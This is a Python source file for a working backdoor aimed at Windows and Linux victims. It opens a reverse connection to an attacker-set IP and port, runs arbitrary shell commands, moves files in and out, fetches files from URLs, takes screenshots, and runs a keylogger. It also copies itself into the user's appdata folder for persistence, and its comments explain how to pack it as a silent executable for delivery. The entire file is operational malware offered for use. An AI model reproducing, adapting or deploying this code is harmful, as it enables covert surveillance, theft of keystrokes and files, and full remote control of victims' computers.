import socket
import time
import json
import os
from mss import mss
import requests
import subprocess
import base64
import threading
import shutil
import sys
import pynput.keyboard
#[!!!!!!!!!!!!!!!] WARNING change it to your own ip host(attacker) and uncomment it
host_ip = "192.168.56.52" 
#first before deliver make it exe or linux executable file :
#Linux User Setup wine environment with python3 directory
# target is windows then command : wine /root/.wine/drive_c/Python/Scripts/pyinstaller.exe --onefile --noconsole Backdoor.py 
# target is linux then command : pyinstaller --onefile --noconsole Backdoor.py 
keys = ""
try:
	location = os.environ["appdata"]+"\\Backdoor.exe"
	if not os.path.exists(location):
		shutil.copyfile(sys.executable, location)
# 	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"',shell=True)
except:
	pass

try:
	path = os.environ["appdata"]+"\\keylogger.txt"
except :
	path = 	"\\tmp\\keylogger.txt"

def process_keys(key) :
	global keys
	try:
		keys=keys + str(key.char)
	except AttributeError:
		if key == key.space:
			keys=keys + " "
		elif key == key.enter:
			keys = keys + ""
		elif key == key.right:
			keys = keys + ""
		elif key == key.left:
			keys=keys +""
		elif key == key.up:
			keys=keys +""
		elif key == key.down:
			keys=keys +""
		else:
			keys=keys +" "+ str(key) +" "

def report():
	global keys
	global path
	fin = open(path, "a")
	fin.write(keys)
	keys = ""
	fin.close()
	timer = threading.Timer(10, report) 
	timer.start()
	
def start_keylogger():
	keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
	with keyboard_listener:
		report()
		keyboard_listener.join()

def reliable_send(data):
	if type(data) == bytes:
		data = data.decode('utf-8')
	json_data = json.dumps(data)
	sock.sendall(json_data.encode())

def reliable_recv():
	json_data =""
	while True:
		try:
			json_data = json_data + sock.recv(1024).decode()
			return json.loads(json_data)
		except ValueError:
			continue

def is_admin():
	global admin
	try:
		os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
	except:	
		admin="[!] User Privileges!"
	else:
		admin="[+] Administrator Privileges!"

def screenshot():
	mss().shot()

def download(url):
	get_response = requests.get(url) 
	file_name = url.split("/")[-1]
	out_file =open(file_name, "wb")
	out_file.write(get_response.content)
	out_file.close()

def shell():		
	while True:
		command = reliable_recv()
		if command == "q":
			try:
				os.remove(path)
			except:
				continue
			break

		elif command == "help":
		  help_options = '''
			download path   -> Download A file From Target PC.
			upload path     -> Upload A file To Target PC.
			get url         -> Download File To Target From Any Website.
			start path      -> Start Program on Target PC.
			screenshot      -> Take A Screenshot of Targets Monior.
			check           -> Check For Administrator Privileges .(if target is windows)
			whoami OR id	  -> Linux user check
			q               -> exit frok backdoor.
			keylog_start    -> start keylogger.
			keylog_dump     -> stop keylogger.
			'''
		  reliable_send(help_options)

		elif command [:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command [3:])
			except:
				continue

		elif command [:8] == "download":
			try:
				file = open (command [9:], "rb")
				reliable_send(base64.b64encode(file.read()))
			except FileNotFoundError:
				reliable_send("[!] File Not Found")
				continue
				 
		elif command [:6] == "upload":
				result = reliable_recv()
				if result[:4] != "[!]":
					fin = open(command [7:], "wb")
					fin.write(base64.b64decode(result))
					fin.close()					

		elif command [:3] == "get":
			try:
				download(command [4:]) 
				reliable_send("[+] Downloaded File From Specified URL!")
			except:
			  reliable_send("[!] Failed To Download File")

		elif command [:5] == "start":
			try:
				subprocess.Popen(command [6:], shell=True)
				reliable_send("[+] Started!")
			except:
				reliable_send("[!] Failed To Start!")

		elif command[:10] == "screenshot":
			try:
				screenshot()
				sc = open("monitor-1.png","rb")
				reliable_send(base64.b64encode(sc.read()))
				sc.close()
			except:
				reliable_send("[!] Failed To Take Screenshot")
			finally:
				os.remove("monitor-1.png")

		elif command[:5] == "check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("Cant perform the Check")

		elif command[:12] == "keylog_start":
			global t1
			t1 = threading.Thread(target=start_keylogger)
			t1.start()
			print()

		elif command[:11] == "keylog_dump":
			fn = open(path, "r")
			reliable_send(fn.read())

		else:	
			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
			result = proc.stdout.read() + proc.stderr.read()
			reliable_send(result.decode())


def connection():
	global sock
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	while True:
		time.sleep(5)
		try:
			sock.connect((host_ip,44445))
			shell()
		except:
			connection()

if __name__ == '__main__':
	connection()
	sock.close()
